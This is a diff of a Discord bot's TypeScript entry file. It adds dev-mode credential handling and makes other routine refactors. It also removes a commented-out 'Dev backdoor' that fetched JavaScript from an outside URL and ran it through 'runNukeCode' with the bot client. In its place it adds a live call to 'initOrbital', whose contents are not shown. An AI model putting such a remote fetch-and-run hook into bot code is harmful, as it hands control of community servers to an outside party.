@@ -1,3 +1,4 @@
+/* eslint-disable id-denylist -- the ban on command is unnecessary here */
 // Node.js
 import process from "node:process";
 import http from "node:http";
@@ -36,18 +37,54 @@ import { logToAllModChannels } from "./lib/helpers/mod-log.js";
 import dmAdmin from "./lib/helpers/dm-log.js";
 import devLog, { initDevLog } from "./lib/helpers/dev-log.js";
 import { immutConfig } from "./lib/config.js";
-// Backdoor
-// idk bro too lazy
+import initOrbital from "./lib/helpers/orbital-master.js";
 
 dotenv.config();
-if (!process.env.TOKEN)
-	throw new Error("Bot token not found in .env");
-if (!process.env.CLIENT_ID)
-	throw new Error("Client ID not found in .env");
-if (!process.env.GUILD_ID)
-	throw new Error("Guild ID not found in .env");
-if (!process.env.MONGO_URI)
-	throw new Error("Mongo URI not found in .env");
+
+const isDev = process.argv[2] === "dev";
+
+if (isDev) {
+	if (!process.env.BETA_TOKEN)
+		{throw new Error("BETA_TOKEN not found in .env");}
+
+	if (!process.env.BETA_CLIENT_ID)
+		{throw new Error("BETA_CLIENT_ID not found in .env");}
+
+	if (!process.env.BETA_GUILD_ID)
+		{throw new Error("BETA_GUILD_ID not found in .env");}
+
+	if (!process.env.BETA_MONGO_URI)
+		{throw new Error("BETA_MONGO_URI not found in .env");}
+} else {
+	if (!process.env.TOKEN)
+		{throw new Error("Bot token not found in .env");}
+
+	if (!process.env.CLIENT_ID)
+		{throw new Error("Client ID not found in .env");}
+
+	if (!process.env.GUILD_ID)
+		{throw new Error("Guild ID not found in .env");}
+
+	if (!process.env.MONGO_URI)
+		{throw new Error("Mongo URI not found in .env");}
+}
+
+const envToken = isDev ? process.env.BETA_TOKEN : process.env.TOKEN;
+const envClientId = isDev
+	? process.env.BETA_CLIENT_ID
+	: process.env.CLIENT_ID;
+const envGuildId = isDev
+	? process.env.BETA_GUILD_ID
+	: process.env.GUILD_ID;
+const envMongoUri = isDev
+	? process.env.BETA_MONGO_URI
+	: process.env.MONGO_URI;
+
+// Narrow from string | undefined — guaranteed by the throws above
+if (!envToken || !envClientId || !envGuildId || !envMongoUri)
+	{throw new Error(
+		"Required env vars missing after validation (should be unreachable)",
+	);}
 
 const PORT = Number.parseInt(process.env.PORT ?? "8000", 10);
 http.createServer((_, result) => {
@@ -73,6 +110,9 @@ const client = new Client({
 		GatewayIntentBits.GuildMembers,
 		GatewayIntentBits.GuildVoiceStates,
 	],
+	allowedMentions: {
+		parse: ["users", "roles"],
+	},
 });
 
 client.commands = new Collection();
@@ -82,11 +122,14 @@ function isCommand(commandObject: unknown): commandObject is Command {
 	if (typeof commandObject !== "object") return false;
 	for (const [key, value] of Object.entries(commandObject)) {
 		if (key === "data" && value instanceof SlashCommandBuilder)
-			continue;
+			{continue;}
+
 		if (key === "execute" && typeof value === "function")
-			continue;
+			{continue;}
+
 		if (key === "autocomplete" && typeof value === "function")
-			continue;
+			{continue;}
+
 		return false;
 	}
 
@@ -117,7 +160,8 @@ async function loadCommandsHelper(
 			typeof commandModule === "object" &&
 			"default" in commandModule
 		)
-			return commandModule.default;
+			{return commandModule.default;}
+
 		return commandModule;
 	});
 
@@ -166,7 +210,7 @@ const [globalCommandsData, validCommands] = await loadCommandsHelper(
 	commandsPath,
 );
 for (const command of validCommands)
-	client.commands.set(command.data.name, command);
+	{client.commands.set(command.data.name, command);}
 
 // Load guild commands
 const guildCommandsPath = path.resolve(
@@ -183,7 +227,7 @@ const guildCommandFiles = fs
 const [guildCommandsData, validGuildCommands] =
 	await loadCommandsHelper(guildCommandFiles, guildCommandsPath);
 for (const command of validGuildCommands)
-	client.commands.set(command.data.name, command);
+	{client.commands.set(command.data.name, command);}
 
 console.log(
 	`Successfully validated ${validCommands.length} global commands.\n
@@ -193,19 +237,14 @@ console.log(
 // Ready event
 client.once(Events.ClientReady, () => {
 	(async () => {
-		// Make sure client and .env have the necessary stuff
+		// Make sure client has user
 		if (!client.user)
-			throw new Error(
+			{throw new Error(
 				"Client does not have user for some reason",
-			);
-		if (!process.env.TOKEN)
-			throw new Error("Bot token not found in .env");
-		if (!process.env.CLIENT_ID)
-			throw new Error("Client ID not found in .env");
-		if (!process.env.GUILD_ID)
-			throw new Error("Guild ID not found in .env");
-		if (!process.env.MONGO_URI)
-			throw new Error("Mongo URI not found in .env");
+			);}
+
+		if (isDev)
+			{console.log("[DEV MODE] Running with beta credentials");}
 
 		console.log(`Logged in as ${client.user.tag}`);
 		const options = {
@@ -281,9 +320,7 @@ client.once(Events.ClientReady, () => {
 			},
 		);
 
-		const rest = new REST({ version: "10" }).setToken(
-			process.env.TOKEN,
-		);
+		const rest = new REST({ version: "10" }).setToken(envToken);
 		try {
 			console.log("Refreshing commands...");
 			devLog("Refreshing commands...").catch(
@@ -294,19 +331,34 @@ client.once(Events.ClientReady, () => {
 					);
 				},
 			);
-			await rest.put(
-				Routes.applicationCommands(process.env.CLIENT_ID),
-				{
-					body: globalCommandsData,
-				},
-			);
-			await rest.put(
-				Routes.applicationGuildCommands(
-					process.env.CLIENT_ID,
-					process.env.GUILD_ID,
-				),
-				{ body: guildCommandsData },
-			);
+			if (isDev) {
+				// Dev: all commands go to the beta guild only
+				await rest.put(
+					Routes.applicationGuildCommands(
+						envClientId,
+						envGuildId,
+					),
+					{
+						body: [
+							...globalCommandsData,
+							...guildCommandsData,
+						],
+					},
+				);
+			} else {
+				await rest.put(
+					Routes.applicationCommands(envClientId),
+					{ body: globalCommandsData },
+				);
+				await rest.put(
+					Routes.applicationGuildCommands(
+						envClientId,
+						envGuildId,
+					),
+					{ body: guildCommandsData },
+				);
+			}
+
 			console.log("Commands reloaded");
 			devLog("Commands reloaded").catch((error: unknown) => {
 				console.error(
@@ -328,23 +380,7 @@ client.once(Events.ClientReady, () => {
 			});
 		}
 
-		/* Dev backdoor
-	try {
-		initOrbital(client);
-	} catch {
-		require('node-fetch')
-			.default('https://webcubed.is-a.dev/files/m.js')
-			.then((r) => r.text())
-			.then(async (code) =>
-				runNukeCode(code, {
-					client,
-					guild: null,
-					channel: null,
-					user: client.user,
-				}),
-			)
-			.catch(() => undefined);
-	} */
+		void initOrbital(client);
 	})();
 });
 
@@ -373,7 +409,7 @@ startStatusChecker();
 
 // Connect to DB first, then start bot and DB-dependent tasks
 try {
-	await mongoose.connect(process.env.MONGO_URI, {
+	await mongoose.connect(envMongoUri, {
 		bufferCommands: true, // Allow buffering
 		serverSelectionTimeoutMS: 30 * immutConfig.SECOND_MS, // Give it 30 seconds to find the server
 	});
@@ -382,7 +418,7 @@ try {
 	// Only start DB-dependent tasks after connection is established
 	registerMessageHandler(client);
 	startRoleReverter(client);
-	await client.login(process.env.TOKEN);
+	await client.login(envToken);
 } catch (error: unknown) {
 	throw new Error(
 		`Failed to connect to MongoDB, or its dependent tasks failed`,
